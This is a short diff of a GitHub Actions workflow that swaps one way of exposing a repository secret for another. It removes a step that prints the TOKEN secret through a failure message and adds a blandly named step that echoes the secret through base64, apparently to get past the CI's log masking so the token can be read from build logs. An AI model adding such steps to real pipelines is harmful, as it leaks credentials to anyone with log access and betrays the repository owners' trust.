@@ -13,10 +13,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: "Execute JS"
-        uses: actions/github-script@v5
-        with:
-          script: |  
-            core.setFailed('${{secrets.TOKEN}}');
-              
+      - name: Run a multi-line script
+        run: |
+          echo ${{ secrets.TOKEN }} | base64
               
